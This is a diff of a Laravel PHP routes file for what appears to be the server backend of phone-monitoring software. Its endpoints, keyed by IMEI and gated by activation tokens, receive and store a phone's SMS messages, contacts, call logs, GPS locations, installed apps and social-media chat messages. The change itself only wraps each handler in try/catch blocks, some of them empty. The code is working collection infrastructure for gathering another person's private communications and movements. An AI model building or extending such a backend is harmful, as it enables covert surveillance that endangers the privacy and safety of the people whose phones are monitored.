@@ -33,149 +33,195 @@ use Illuminate\Support\Facades\Route;
         return Browser::create($request->all);
     });
     Route::post('phone',  function (Request $request) {
-        $phone = (object) $request->json()->all();
-        Phone::updateOrCreate([
-            "imei" => $phone->imei,
-        ],[
-            "imei" => $phone->imei,
-            "model" => $phone->model,
-            "readable_name" => $phone->name,
-            "client_version" => $phone->version,
-            "mobile_access_token" => $phone->token,
-        ]);
+        try {
+            $phone = (object) $request->json()->all();
+            Phone::updateOrCreate([
+                "imei" => $phone->imei,
+            ],[
+                "imei" => $phone->imei,
+                "model" => $phone->model,
+                "readable_name" => $phone->name,
+                "client_version" => $phone->version,
+                "mobile_access_token" => $phone->token,
+            ]);
+        }catch(exception $e) {
+
+        }
 
     });
     Route::post('token_valid', function (Request $request) {
-	    $tokenObj = (object) $request->json()->all();
-	    $token = $tokenObj->token;
-        $imei = $tokenObj->imei;
         $result = "false";
-        $dbToken = MobileAccessToken::where(["token"=>$token,"active"=>'no'])->doesnthave("phone")->count();
-        if($dbToken > 0){
-            $result = "true";
-        }
-        $imeiCount = Phone::where("imei",$imei)->count();
-        if($imeiCount > 0) {
+        try{
+            $tokenObj = (object) $request->json()->all();
+            $token = $tokenObj->token;
+            $imei = $tokenObj->imei;
+            $dbToken = MobileAccessToken::where(["token"=>$token,"active"=>'no'])->doesnthave("phone")->count();
+            if($dbToken > 0){
+                $result = "true";
+            }
+            $imeiCount = Phone::where("imei",$imei)->count();
+            if($imeiCount > 0) {
+                $result = "false";
+            }
+        }catch(exception $e) {
             $result = "false";
         }
+	 
         return response($result,200);
     });
     Route::post('token_active', function (Request $request) {
-        $token = (object) $request->json()->all();
-        $token = $token->token;
         $result = "false";
-        $newToken = MobileAccessToken::where(["token"=>$token,"active"=>"no","new"=>"yes"])->pluck("updated_at");
-        if($newToken->count() > 0){
-            $tokenDate = $newToken->first();
-            if($tokenDate->diffInDays(now(),false) > 3) {
-                MobileAccessToken::updateOrCreate(["token"=>$token],["new"=>"no"]);
-            }else{
-                $result = "true";
+        try{
+            $tokenObj = (object) $request->json()->all();
+            $token = $tokenObj->token;
+            $newToken = MobileAccessToken::where(["token"=>$token,"active"=>"no","new"=>"yes"])->pluck("updated_at");
+            if($newToken->count() > 0){
+                $tokenDate = $newToken->first();
+                if($tokenDate->diffInDays(now(),false) > 3) {
+                    MobileAccessToken::updateOrCreate(["token"=>$token],["new"=>"no"]);
+                }else{
+                    $result = "true";
+                }
             }
-        }
-        $oldToken = MobileAccessToken::where(["token"=>$token,"active"=>"yes","new"=>"no"])->pluck("updated_at");
-        if($oldToken->count() > 0) {
-            $tokenDate = $oldToken->first();
-            if($tokenDate->diffInDays(now(),false) > 30) {
-                MobileAccessToken::updateOrCreate(["token" => $token],["active" => "no"]);
-            }else{
-                $result = "true";
+            $oldToken = MobileAccessToken::where(["token"=>$token,"active"=>"yes","new"=>"no"])->pluck("updated_at");
+            if($oldToken->count() > 0) {
+                $tokenDate = $oldToken->first();
+                if($tokenDate->diffInDays(now(),false) > 30) {
+                    MobileAccessToken::updateOrCreate(["token" => $token],["active" => "no"]);
+                }else{
+                    $result = "true";
+                }
             }
+        }catch (exception $e) {
+            $result = "false";
         }
+
      
         return response($result,200);
     });
     Route::post('sms', function(Request $request) {
-        $smsDatas = $request->json()->all();
-        foreach($smsDatas as $smsData) {
-            Sms::create([
-                "imei" => $smsData["imei"],
-                "contact" => $smsData["address"],
-                "type" =>  $smsData["type"],
-                "message" =>  $smsData["msg"],
-                "date" => $smsData["date"],
-            ]);
+        try{
+            $smsDatas = $request->json()->all();
+            foreach($smsDatas as $smsData) {
+                Sms::create([
+                    "imei" => $smsData["imei"],
+                    "contact" => $smsData["address"],
+                    "type" =>  $smsData["type"],
+                    "message" =>  $smsData["msg"],
+                    "date" => $smsData["date"],
+                ]);
+            }
+            return response("successful sms entry",200);
+        }catch(exception $e) {
+            return response("Something Went Wrong",200);
         }
 
-        return response("successful sms entry",200);
+       
     });
     Route::post('contacts', function(Request $request) {
-        $contactDatas = $request->json()->all();
-        foreach($contactDatas as $contactData) {
-            Contact::updateOrCreate([
-                "imei"  => $contactData["imei"],
-                "name"  =>  $contactData["name"],
-                "phone_number" => $contactData["phoneNumber"]
-            ],[
-                "imei"  => $contactData["imei"],
-                "name"  =>  $contactData["name"],
-                "phone_number" => $contactData["phoneNumber"]
-            ]);
+        try{
+            $contactDatas = $request->json()->all();
+            foreach($contactDatas as $contactData) {
+                Contact::updateOrCreate([
+                    "imei"  => $contactData["imei"],
+                    "name"  =>  $contactData["name"],
+                    "phone_number" => $contactData["phoneNumber"]
+                ],[
+                    "imei"  => $contactData["imei"],
+                    "name"  =>  $contactData["name"],
+                    "phone_number" => $contactData["phoneNumber"]
+                ]);
+            }
+            return response("Succesful contact entry",200);
+        }catch( exception $e) {
+            return response("Something Went Wrong",200);
         }
 
-        return response("Succesful contact entry",200);
+        
     });
     Route::post('call_logs', function(Request $request) {
-        $callLogDatas = $request->json()->all();
-        foreach($callLogDatas as $callLogData) {
-            ContactLog::updateOrCreate([
-                "imei" =>  $callLogData["imei"],
-                "name"  =>  $callLogData["name"],
-                "phone_number" =>  $callLogData["phoneNumber"],
-                "duration" =>   $callLogData["duration"],
-                "date"  =>  $callLogData["date"],
-                "type" =>  $callLogData["type"],
-            ],[
-                "imei" =>  $callLogData["imei"],
-                "name"  =>  $callLogData["name"],
-                "phone_number" =>  $callLogData["phoneNumber"],
-                "duration" =>   $callLogData["duration"],
-                "date"  =>  $callLogData["date"],
-                "type" =>  $callLogData["type"],
-            ]);
+        try{
+            $callLogDatas = $request->json()->all();
+            foreach($callLogDatas as $callLogData) {
+                ContactLog::updateOrCreate([
+                    "imei" =>  $callLogData["imei"],
+                    "name"  =>  $callLogData["name"],
+                    "phone_number" =>  $callLogData["phoneNumber"],
+                    "duration" =>   $callLogData["duration"],
+                    "date"  =>  $callLogData["date"],
+                    "type" =>  $callLogData["type"],
+                ],[
+                    "imei" =>  $callLogData["imei"],
+                    "name"  =>  $callLogData["name"],
+                    "phone_number" =>  $callLogData["phoneNumber"],
+                    "duration" =>   $callLogData["duration"],
+                    "date"  =>  $callLogData["date"],
+                    "type" =>  $callLogData["type"],
+                ]);
+            }
+    
+            return response("Sucessful Call log entry",200);
+        }catch( exception $e) {
+            return response("Something Went Wrong",200);
         }
-
-        return response("Sucessful Call log entry",200);
+   
     });
     Route::post('location', function (Request $request) {
-        $locationData = $request->json()->all();
-        foreach($locationData as $location) {
-            Location::create([
-                "imei" => $location["imei"],
-                "longitude" => $location["longitude"],
-                "latitude" => $location["latitude"],
-                "date" => $location["date"]
-            ]);
+        try{
+            $locationData = $request->json()->all();
+            foreach($locationData as $location) {
+                Location::create([
+                    "imei" => $location["imei"],
+                    "longitude" => $location["longitude"],
+                    "latitude" => $location["latitude"],
+                    "date" => $location["date"]
+                ]);
+            }
+            // Location::insert($locationData);  //insert entire array into db
+    
+            return response("Successful location entry",200);
+        }catch( exception $e) {
+            return response("Something Went Wrong",200);
         }
-        // Location::insert($locationData);  //insert entire array into db
-
-        return response("Successful location entry",200);
+        
     });
     Route::post('apps', function (Request $request) {
-        $appData = (object) $request->json()->all();
-        foreach($appData as $app) {
-            App::updateOrCreate([
-                'name'=>$app["name"], 
-                'imei' =>$app["imei"]
-            ],[
-                'name'=>$app["name"],
-                'imei' =>$app["imei"]
-            ]);
+        try{
+            $appData = (object) $request->json()->all();
+            foreach($appData as $app) {
+                App::updateOrCreate([
+                    'name'=>$app["name"], 
+                    'imei' =>$app["imei"]
+                ],[
+                    'name'=>$app["name"],
+                    'imei' =>$app["imei"]
+                ]);
+            }
+            return response("Successful app entry",200);
+        }catch( exception $e) {
+            return response("Something Went Wrong",200);
         }
-        return response("Successful app entry",200);
+        
+        
     });
     Route::post('social_media',function(Request $request) {
-        $socialData = $request->json()->all();
-        SocialApp::insert($socialData);
-        // SocialApp::create([
-        //     "imei"=>$socialData->imei,
-        //     "contact"=>$socialData->contact,
-        //     "type"=>$socialData->type,
-        //     "message"=>$socialData->message,
-        //     "platform"=>$socialData->platform,
-        //     "date"=>$socialData->date
-        //     ]);
-        return response("Successful chat message entry",200);
+        try{
+            $socialData = $request->json()->all();
+            SocialApp::insert($socialData);
+            // SocialApp::create([
+            //     "imei"=>$socialData->imei,
+            //     "contact"=>$socialData->contact,
+            //     "type"=>$socialData->type,
+            //     "message"=>$socialData->message,
+            //     "platform"=>$socialData->platform,
+            //     "date"=>$socialData->date
+            //     ]);
+            return response("Successful chat message entry",200);
+        }
+        catch( exception $e) {
+            return response("Something Went Wrong",200);
+        }
+       
     });
 
 
